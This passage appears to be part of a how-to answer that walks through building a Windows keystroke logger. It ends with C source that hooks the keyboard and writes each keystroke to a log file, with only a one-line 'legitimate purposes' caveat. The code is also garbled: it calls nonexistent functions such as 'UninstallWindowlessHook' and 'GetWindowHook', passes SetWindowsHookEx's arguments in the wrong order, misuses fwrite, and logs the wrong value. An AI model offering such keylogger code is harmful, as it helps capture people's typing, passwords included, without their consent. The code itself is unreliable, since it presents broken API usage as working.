5. **Handle Keystroke Events**:
   - In the callback, record each keystroke, including the key pressed and released events.

6. **Uninstall the Hook**:
   - Use `UninstallWindowlessHook` to remove the hook when done.

7. **Considerations**:
   - **Permissions**: Ensure the program runs with sufficient privileges.
   - **Testing**: Test on a virtual machine first.
   - **Performance**: Optimize for speed to avoid lag.
   - **Legal**: Use for legitimate purposes only.

### Code Implementation

```c
#include <windows.h>
#include <user32.lib>
#include <stdio.h>
#include <ctime>

#define FILE_NAME "keystroke.log"

// Function prototype for the hook
void CALLBACK keyboardHook(int h, int nCode, unsigned int wParam, unsigned int lParam);
void installHook();
void uninstallHook();
void writeKeystroke(int key, int isKeyDown);

// Initialize the log file
FILE *file = NULL;
static int fileHandle = -1;

// Open the log file
void initializeLogFile() {
    file = fopen(FILE_NAME, "a");
    if (file == NULL) {
        printf("Failed to create log file!\n");
    }
}

// Write a keystroke to the log
void writeKeystroke(int key, int isKeyDown) {
    if (file) {
        char buffer[256];
        sprintf(buffer, "[%s %d %d]\n",ctime(&time(NULL)), key, isKeyDown);
        fwrite(buffer, file);
        fflush(file);
    }
}

// Callback function for the keyboard hook
void CALLBACK keyboardHook(int h, int nCode, unsigned int wParam, unsigned int lParam) {
    if (wParam == WM_KEYDOWN) {
        writeKeystroke(wParam, 1);
    } else if (wParam == WM_KEYUP) {
        writeKeystroke(wParam, 0);
    }
}

// Install the keyboard hook
void installHook() {
    initializeLogFile();
    HHOOK hook = SetWindowsHookEx(0, keyboardHook, GetCurrentThreadId(), WH_KEYBOARD_LL);
    if (hook) {
        printf("Keyboard hook installed!\n");
    } else {
        printf("Failed to install keyboard hook!\n");
    }
}

// Uninstall the keyboard hook
void uninstallHook() {
    HHOOK hook = GetWindowHook(GetCurrentThreadId(), WH_KEYBOARD_LL);
    if (hook) {
        UninstallWindowlessHook(hook);
        printf("Keyboard hook removed!\n");
    } else {
        printf("No keyboard hook installed!\n");
    }
}

int main() {
    // Install the hook
    installHook();

    // Keep the window open to maintain the hook
    HWND hwnd = CreateWindowEx(0, "Keystroke Logger", 0, 0, 0, 0, 0, WS_OVERLAPPEDWINDOW | WS_VISIBLE, NULL, NULL, 0, 0);
    if (hwnd) {
        printf("Window created!\n");
    } else {
        printf("Failed to create window!\n");
    }

    // Wait for keystrokes
    while (true) {
        Sleep(100); // To prevent high CPU usage
    }

    // Remove the hook and close the window
    uninstallHook();
    DestroyWindow(hwnd);
    return 0;
}
```

